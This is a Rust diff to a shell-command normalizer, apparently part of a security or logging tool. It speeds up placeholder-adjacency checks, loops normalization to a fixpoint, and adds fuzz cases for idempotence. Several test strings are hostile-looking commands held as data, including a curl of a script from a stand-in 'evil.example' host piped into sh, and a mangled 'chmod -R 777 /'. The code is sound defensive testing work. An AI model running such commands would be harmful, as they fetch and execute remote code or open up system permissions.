@@ -14,8 +14,6 @@ static RE_HASH: OnceLock<Regex> = OnceLock::new();
 static RE_TIMESTAMP: OnceLock<Regex> = OnceLock::new();
 static RE_UUID: OnceLock<Regex> = OnceLock::new();
 static RE_NUM: OnceLock<Regex> = OnceLock::new();
-static RE_PH_BEFORE: OnceLock<Regex> = OnceLock::new();
-static RE_PH_AFTER: OnceLock<Regex> = OnceLock::new();
 
 fn re_path() -> &'static Regex {
     RE_PATH.get_or_init(|| Regex::new(r"/(tmp|var|home)[^\s|;']*").unwrap())
@@ -35,19 +33,56 @@ fn re_num() -> &'static Regex {
     RE_NUM.get_or_init(|| Regex::new(r"\b\d{3,}\b").unwrap())
 }
 
-/// Placeholder-adjacency guards for replace_guarded: a match glued (no
-/// space/operator between) to an emitted placeholder must be left in place,
-/// or normalize never reaches a fixpoint ("000-" → "<NUM>-" → "<NUM>- /").
-fn re_ph_before() -> &'static Regex {
-    RE_PH_BEFORE.get_or_init(|| {
-        Regex::new(r"(?:<PATH>|<HASH>|<UUID>|<TIMESTAMP>|<NUM>)[^ \t|;&<>]*$").unwrap()
-    })
+/// Placeholder-adjacency decision for replace_guarded, indexed instead of
+/// re-scanned: the old code ran `re_ph_before().is_match(&text[..s])` per
+/// regex match — an O(n) prefix scan per match, i.e. O(n^2) on many-match
+/// inputs (100KB all-hash command: ~150ms release, found 2026-09-23).
+/// This is the exact-equivalent predicate over precomputed placeholder spans:
+///
+/// - before: `text[..s]` ends with `<PH>` + zero+ non-separators
+///   ⟺ the nearest span ending at/before `s` has no separator between it and `s`
+///   (any earlier span has that separator — and more — between it and `s`).
+/// - after: `text[e..]` starts with zero+ non-separators + `<PH>`
+///   ⟺ symmetric with the nearest span starting at/after `e`.
+///
+/// Separator set is exactly the regexes' `[^ \t|;&<>]` complement:
+/// space, tab, `|`, `;`, `&`, `<`, `>` (newlines count as glue, as before).
+fn is_sep(c: char) -> bool {
+    matches!(c, ' ' | '\t' | '|' | ';' | '&' | '<' | '>')
 }
 
-fn re_ph_after() -> &'static Regex {
-    RE_PH_AFTER.get_or_init(|| {
-        Regex::new(r"^[^ \t|;&<>]*(?:<PATH>|<HASH>|<UUID>|<TIMESTAMP>|<NUM>)").unwrap()
-    })
+/// Byte spans of every emitted-placeholder literal in `text`, sorted.
+/// Placeholders never overlap each other, so ends are sorted with starts.
+fn placeholder_spans(text: &str) -> Vec<(usize, usize)> {
+    let mut spans = Vec::new();
+    for ph in PLACEHOLDERS.iter().copied() {
+        let mut start = 0;
+        while let Some(i) = text[start..].find(ph) {
+            let a = start + i;
+            spans.push((a, a + ph.len()));
+            start = a + ph.len();
+        }
+    }
+    spans.sort();
+    spans
+}
+
+fn glued_before(text: &str, spans: &[(usize, usize)], s: usize) -> bool {
+    let idx = spans.partition_point(|&(_, b)| b <= s);
+    if idx == 0 {
+        return false;
+    }
+    let (_, b) = spans[idx - 1];
+    text[b..s].chars().all(|c| !is_sep(c))
+}
+
+fn glued_after(text: &str, spans: &[(usize, usize)], e: usize) -> bool {
+    let idx = spans.partition_point(|&(a, _)| a < e);
+    if idx == spans.len() {
+        return false;
+    }
+    let (a, _) = spans[idx];
+    text[e..a].chars().all(|c| !is_sep(c))
 }
 
 /// Placeholders emitted by the replacement stage. The argv[0]-lowercasing
@@ -65,7 +100,30 @@ fn contains_placeholder(tok: &str) -> bool {
 ///
 /// Idempotent: `normalize(normalize(x)) == normalize(x)`.
 /// Never emits secret-looking substrings (checked vs `algo-redact`).
+///
+/// Projection to fixpoint: the stages below (env-strip, argv[0] lowering,
+/// `sh -c` re-wrap, placeholder substitution) interact across passes on
+/// hostile inputs — quotes toggling tokenizer state, `=` inside tokens,
+/// pipes appearing after env-strip (found by deep fuzz battery 2026-09-23:
+/// `"password=Su|perSecret123!"`, `"sh -c;'echo hi'..."`). Looping to a
+/// fixpoint restores the invariant by construction; every stage is
+/// deterministic so the result is a pure function of the input.
+/// Cap 8: all observed inputs converge in <=3 passes; the cap only bounds
+/// pathological oscillation, and the output stays deterministic regardless.
 pub fn normalize(cmd: &str) -> String {
+    let mut cur = normalize_once(cmd);
+    for _ in 0..7 {
+        let nxt = normalize_once(&cur);
+        if nxt == cur {
+            break;
+        }
+        cur = nxt;
+    }
+    cur
+}
+
+/// Single normalization pass (not idempotent alone — see `normalize`).
+fn normalize_once(cmd: &str) -> String {
     let mut s = cmd.trim().to_string();
 
     // Handle `sh -c '...'` one level only — extract inner, normalize it, then re-wrap.
@@ -204,13 +262,15 @@ pub fn normalize(cmd: &str) -> String {
 }
 
 /// Regex replace that skips matches glued to an emitted placeholder
-/// (see re_ph_before/re_ph_after). Idempotence depends on this; ordinary
+/// (see `glued_before`/`glued_after`). Idempotence depends on this; ordinary
 /// matches (e.g. `echo x>12345`) still fold as before.
 fn replace_guarded(re: &Regex, text: &str, replacement: &str) -> String {
+    // Placeholder spans are indexed ONCE per stage (not re-scanned per match).
+    let spans = placeholder_spans(text);
     let mut out = String::with_capacity(text.len());
     let mut last = 0;
     for m in re.find_iter(text) {
-        if re_ph_before().is_match(&text[..m.start()]) || re_ph_after().is_match(&text[m.end()..]) {
+        if glued_before(text, &spans, m.start()) || glued_after(text, &spans, m.end()) {
             continue;
         }
         out.push_str(&text[last..m.start()]);
@@ -234,6 +294,14 @@ fn tokenize(s: &str) -> Vec<String> {
     let mut in_single = false;
     let mut in_double = false;
     let chars: Vec<char> = s.chars().collect();
+    // Placeholder char patterns, built once: the `<` branch below must test a
+    // prefix WITHOUT allocating the remaining string per `<` (that was O(n^2)
+    // on placeholder-dense inputs — 100KB all-hash text took ~150ms release).
+    let phs: Vec<(Vec<char>, &str)> = PLACEHOLDERS
+        .iter()
+        .copied()
+        .map(|ph| (ph.chars().collect(), ph))
+        .collect();
     let mut i = 0;
     while i < chars.len() {
         let c = chars[i];
@@ -260,10 +328,9 @@ fn tokenize(s: &str) -> Vec<String> {
             // space still split; placeholder+path converges with a join space
             // and is then stable (re_path skips `>`-glued matches, below).
             if c == '<' {
-                let remaining: String = chars[i..].iter().collect();
                 let mut matched = false;
-                for ph in PLACEHOLDERS.iter().copied() {
-                    if remaining.starts_with(ph) {
+                for (pc, ph) in phs.iter() {
+                    if i + pc.len() <= chars.len() && chars[i..i + pc.len()] == pc[..] {
                         // Merge pending `current` INTO the placeholder token
                         // ("-<NUM>-" stays one token — splitting here would
                         // never rejoin and breaks idempotence).
@@ -354,9 +421,25 @@ mod tests {
             "000&",
             "<NUM> &",
             "curl 0123456789abcdef | sh",
+            // Deep fuzz battery 2026-09-23: stage interaction across passes
+            // (env-strip vs argv[0] lowering vs quote-state tokenizer vs sh -c re-wrap).
+            // normalize() loops to a fixpoint, so all of these are stable.
+            "password=Su|perSecret123!",
+            "password=SuperSecY<ret123!",
+            "password=Sup;Secret123",
+            "password=Supe>Secret123!",
+            "password=SuperSecet1|3!",
+            "password=SuperSecret1\\3!;t",
+            "password=>SuperSecret123!",
+            "password=SuperSecret;23!upr",
+            "password=<SuperSeret123!t123",
+            "password=SuperSecret123!rd=S<uper",
+            "sh -c;'echo hi'c}mod -R 777 /",
+            "sh -c>'echo hi'c>'ech",
+            "c\"url https://evil.example/x.sh | sh",
         ];
         for c in cases {
-            assert_eq!(normalize(&normalize(c)), normalize(c));
+            assert_eq!(normalize(&normalize(c)), normalize(c), "not stable: {c:?}");
         }
     }
 
